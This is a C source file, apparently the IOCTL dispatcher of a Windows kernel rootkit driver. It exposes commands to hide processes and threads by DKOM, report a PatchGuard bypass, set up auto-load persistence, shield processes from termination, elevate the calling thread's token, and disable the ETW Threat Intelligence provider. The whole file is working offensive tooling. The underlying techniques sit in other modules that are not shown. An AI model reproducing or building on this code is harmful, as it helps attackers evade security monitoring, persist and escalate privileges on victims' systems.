#include "Dispatch.h"
#include "ProcessModule.h"
#include "ProcessProtect.h"
#include "ThreadModule.h"
#include "TaskPersistence.h"
#include "SelfElevate.h"
#include "Bypass.h"
#include "EtwTi.h"
#include "Shared.h"
#include <ntddk.h>

//
// Process income connect from client
//
NTSTATUS DispatchCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  DbgPrint("Client connected.\n");

  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

//
// Process close connect from client
//
NTSTATUS DispatchClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  DbgPrint("Client disconnected.\n");

  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

//
// Process IOCTL
//
NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
  NTSTATUS status = STATUS_SUCCESS;
  ULONG bytesReturned = 0;

  ULONG ioctlCode = stack->Parameters.DeviceIoControl.IoControlCode;
  PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
  PVOID outputBuffer = Irp->AssociatedIrp.SystemBuffer;
  ULONG inputLength = stack->Parameters.DeviceIoControl.InputBufferLength;
  ULONG outputLength = stack->Parameters.DeviceIoControl.OutputBufferLength;

  DbgPrint("IOCTL received: 0x%X\n", ioctlCode);

  switch (ioctlCode) {

  // ------------------------------------------------------
  // PING
  // ------------------------------------------------------
  case IOCTL_PING:
    DbgPrint("PING called\n");
    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status = STATUS_SUCCESS;
      response->Data = 0xDEADBEEF;
      bytesReturned = sizeof(DRIVER_RESPONSE);
    } else {
      status = STATUS_BUFFER_TOO_SMALL;
    }
    break;

  // ------------------------------------------------------
  // GET_VERSION
  // ------------------------------------------------------
  case IOCTL_GET_VERSION:
    DbgPrint("GET_VERSION called\n");
    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status = STATUS_SUCCESS;
      response->Data = 0x00010000;
      bytesReturned = sizeof(DRIVER_RESPONSE);
    } else {
      status = STATUS_BUFFER_TOO_SMALL;
    }
    break;

  // ------------------------------------------------------
  // GET_PG_STATUS
  // ------------------------------------------------------
  case IOCTL_GET_PG_STATUS:
    DbgPrint("GET_PG_STATUS called\n");
    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status = STATUS_SUCCESS;
      response->Data = g_PatchGuardBypassed ? 1 : 0;
      bytesReturned = sizeof(DRIVER_RESPONSE);
    } else {
      status = STATUS_BUFFER_TOO_SMALL;
    }
    break;

  // ------------------------------------------------------
  // Process DKOM module (see ProcessModule.c)
  // ------------------------------------------------------
  case IOCTL_HIDE_PROCESS:
    DbgPrint("HIDE_PROCESS requested.\n");
    if (!g_PatchGuardBypassed) {
      status = STATUS_NOT_SUPPORTED;
      break;
    }
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
      status = ProcessHide(req->ProcessId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_UNHIDE_PROCESS:
    DbgPrint("UNHIDE_PROCESS requested.\n");
    if (!g_PatchGuardBypassed) {
      status = STATUS_NOT_SUPPORTED;
      break;
    }
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
      status = ProcessUnhide(req->ProcessId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_LIST_HIDDEN_PROCESSES:
    DbgPrint("LIST_HIDDEN_PROCESSES requested.\n");
    if (outputLength == sizeof(PROCESS_LIST_RESPONSE)) {
      status = ProcessListHidden((PPROCESS_LIST_RESPONSE)outputBuffer);
      bytesReturned = sizeof(PROCESS_LIST_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  // ------------------------------------------------------
  // Thread DKOM module (see ProcessModule.c)
  // ------------------------------------------------------
  case IOCTL_HIDE_THREAD:
    DbgPrint("HIDE_THREAD requested.\n");
    if (!g_PatchGuardBypassed) {
      status = STATUS_NOT_SUPPORTED;
      break;
    }
    if (inputLength == sizeof(THREAD_REQUEST)) {
      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
      status = ThreadHide(req->ThreadId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_UNHIDE_THREAD:
    DbgPrint("UNHIDE_THREAD requested.\n");
    if (!g_PatchGuardBypassed) {
      status = STATUS_NOT_SUPPORTED;
      break;
    }
    if (inputLength == sizeof(THREAD_REQUEST)) {
      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
      status = ThreadUnhide(req->ThreadId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_LIST_HIDDEN_THREADS:
    DbgPrint("LIST_HIDDEN_THREADS requested.\n");
    if (outputLength == sizeof(THREAD_LIST_RESPONSE)) {
      status = ThreadListHidden((PTHREAD_LIST_RESPONSE)outputBuffer);
      bytesReturned = sizeof(THREAD_LIST_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  // ------------------------------------------------------
  // Auto-load task control (see TaskPersistence.c)
  // ------------------------------------------------------
  case IOCTL_TASK_CONTROL:
    DbgPrint("TASK_CONTROL requested.\n");
    if (inputLength == sizeof(TASK_REQUEST) &&
        outputLength >= sizeof(DRIVER_RESPONSE)) {
      PTASK_REQUEST req = (PTASK_REQUEST)inputBuffer;
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status =
          TaskPersistenceControl(req->Operation, &response->Data);
      bytesReturned = sizeof(DRIVER_RESPONSE);
      // IRP status stays STATUS_SUCCESS so the client can read the response.
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_TASK_SET_IMAGE_PATH:
    DbgPrint("TASK_SET_IMAGE_PATH requested.\n");
    if (inputLength >= sizeof(WCHAR) && inputLength / sizeof(WCHAR) < 512) {
      status = TaskPersistenceSetImagePath((PWCHAR)inputBuffer,
                                           inputLength / sizeof(WCHAR));
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  // ------------------------------------------------------
  // Process anti-kill module (see ProcessProtect.c)
  // ------------------------------------------------------
  case IOCTL_PROTECT_PROCESS:
    DbgPrint("PROTECT_PROCESS requested. inLen=%lu outLen=%lu\n", inputLength,
             outputLength);
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PROCESS_REQUEST req = *(PPROCESS_REQUEST)inputBuffer;
      DbgPrint("  pid=%lu\n", req.ProcessId);
      status = ProcessProtect(req.ProcessId);
      bytesReturned = 0;
    } else {
      DbgPrint("  bad input size, expected %lu\n", sizeof(PROCESS_REQUEST));
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_UNPROTECT_PROCESS:
    DbgPrint("UNPROTECT_PROCESS requested. inLen=%lu outLen=%lu\n",
             inputLength, outputLength);
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PROCESS_REQUEST req = *(PPROCESS_REQUEST)inputBuffer;
      DbgPrint("  pid=%lu\n", req.ProcessId);
      status = ProcessUnprotect(req.ProcessId);
      bytesReturned = 0;
    } else {
      DbgPrint("  bad input size, expected %lu\n", sizeof(PROCESS_REQUEST));
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_LIST_PROTECTED_PROCESSES:
    DbgPrint("LIST_PROTECTED_PROCESSES requested.\n");
    if (outputLength == sizeof(PROTECTED_PROCESS_LIST_RESPONSE)) {
      status =
          ProcessListProtected((PPROTECTED_PROCESS_LIST_RESPONSE)outputBuffer);
      bytesReturned = sizeof(PROTECTED_PROCESS_LIST_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_GET_PROTECT_STATUS:
    DbgPrint("GET_PROTECT_STATUS requested.\n");
    if (outputLength == sizeof(PROTECT_STATUS_RESPONSE)) {
      status = ProcessProtectQueryStatus(
          (PPROTECT_STATUS_RESPONSE)outputBuffer);
      bytesReturned = sizeof(PROTECT_STATUS_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_ELEVATE_SELF:
  case IOCTL_UNELEVATE_SELF:
  case IOCTL_QUERY_ELEVATION: {
    DbgPrint("0x%X requested.\n", ioctlCode);
    if (outputLength == sizeof(ELEVATE_STATUS_RESPONSE)) {
      PELEVATE_STATUS_RESPONSE response =
          (PELEVATE_STATUS_RESPONSE)outputBuffer;
      RtlZeroMemory(response, sizeof(ELEVATE_STATUS_RESPONSE));
      response->ThreadId = HandleToULong(PsGetCurrentThreadId());

      if (ioctlCode == IOCTL_ELEVATE_SELF) {
        status = SelfElevate();
      } else if (ioctlCode == IOCTL_UNELEVATE_SELF) {
        status = SelfUnelevate();
      } else {
        status = STATUS_SUCCESS;
      }

      //
      // Report the state the thread ended up in rather than the one the caller
      // asked for. The set call is allowed to succeed while the token does not
      // stick, and the query is the only way to tell the two apart.
      //
      response->Status = status;
      if (NT_SUCCESS(status)) {
        ULONG elevated = 0;
        status = SelfQueryElevation(&elevated);
        response->Status = status;
        response->Elevated = elevated;
      }
      bytesReturned = sizeof(ELEVATE_STATUS_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;
  }

  // ------------------------------------------------------
  // ETW-TI provider control (see EtwTi.c)
  // ------------------------------------------------------
  case IOCTL_ETWTI_DISABLE:
  case IOCTL_ETWTI_ENABLE:
  case IOCTL_ETWTI_STATUS: {
    NTSTATUS moduleStatus;

    DbgPrint("0x%X requested.\n", ioctlCode);
    if (outputLength < sizeof(ETWTI_STATUS_RESPONSE)) {
      DbgPrint("  bad output size, expected %lu\n",
               sizeof(ETWTI_STATUS_RESPONSE));
      status = STATUS_BUFFER_TOO_SMALL;
      break;
    }

    switch (ioctlCode) {
    case IOCTL_ETWTI_DISABLE:
      moduleStatus = EtwTiDisable((PETWTI_STATUS_RESPONSE)outputBuffer);
      break;
    case IOCTL_ETWTI_ENABLE:
      moduleStatus = EtwTiEnable((PETWTI_STATUS_RESPONSE)outputBuffer);
      break;
    default:
      moduleStatus = EtwTiQueryStatus((PETWTI_STATUS_RESPONSE)outputBuffer);
      break;
    }

    bytesReturned = sizeof(ETWTI_STATUS_RESPONSE);

    //
    // A failure here is normally "this build is not the verified one" or "the
    // chain did not resolve", and both are more useful to the client as data than
    // as a failed IRP: the response carries the reason plus the resolved
    // addresses, which is the whole diagnostic value of the call. The IRP status
    // therefore stays successful and Response->Status carries the real outcome.
    //
    status = STATUS_SUCCESS;
    DbgPrint("  module status 0x%X\n", moduleStatus);
    break;
  }

  default:
    DbgPrint("Unknown IOCTL: 0x%X\n", ioctlCode);
    status = STATUS_INVALID_DEVICE_REQUEST;
    break;
  }

  Irp->IoStatus.Status = status;
  Irp->IoStatus.Information = bytesReturned;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return status;
}